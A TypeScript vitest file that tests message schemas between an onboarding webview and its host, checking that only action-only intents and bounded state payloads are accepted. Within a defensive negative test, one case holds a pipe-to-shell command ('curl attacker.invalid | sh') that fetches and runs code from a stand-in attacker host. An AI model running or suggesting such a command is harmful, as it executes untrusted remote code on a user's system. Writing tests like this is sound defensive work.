import { describe, expect, it } from "vitest";
import {
  HostToOnboardingMessageSchema,
  OnboardingToHostMessageSchema
} from "./messages";

describe("onboarding messages", () => {
  it("accepts only action-only webview intents", () => {
    for (const type of [
      "ready",
      "install",
      "verifyAgain",
      "selectExisting",
      "initializeRepository",
      "openRepository",
      "showTerminal"
    ]) {
      expect(OnboardingToHostMessageSchema.safeParse({ type }).success).toBe(true);
    }
    expect(OnboardingToHostMessageSchema.safeParse({
      type: "install",
      command: "curl attacker.invalid | sh"
    }).success).toBe(false);
    expect(OnboardingToHostMessageSchema.safeParse({
      type: "install",
      url: "https://attacker.invalid"
    }).success).toBe(false);
  });

  it("accepts every bounded host state", () => {
    for (const state of [
      { kind: "ready-to-install", platform: "macOS", command: "install" },
      { kind: "installing", platform: "Linux", command: "install" },
      { kind: "verifying" },
      {
        kind: "ready",
        version: "0.1.7",
        executable: "/bin/compass",
        hasWorkspace: true
      },
      {
        kind: "error",
        title: "Failed",
        message: "No executable",
        searched: ["/bin/compass"],
        canVerifyAgain: true
      },
      { kind: "unsupported", platform: "freebsd", message: "Use an archive" }
    ]) {
      expect(HostToOnboardingMessageSchema.safeParse({
        type: "state",
        state
      }).success).toBe(true);
    }
  });

  it("rejects oversized and open-ended state payloads", () => {
    expect(HostToOnboardingMessageSchema.safeParse({
      type: "state",
      state: {
        kind: "error",
        title: "Failed",
        message: "x".repeat(8193),
        searched: [],
        canVerifyAgain: true
      }
    }).success).toBe(false);
    expect(HostToOnboardingMessageSchema.safeParse({
      type: "state",
      state: {
        kind: "verifying",
        command: "not allowed"
      }
    }).success).toBe(false);
  });
});
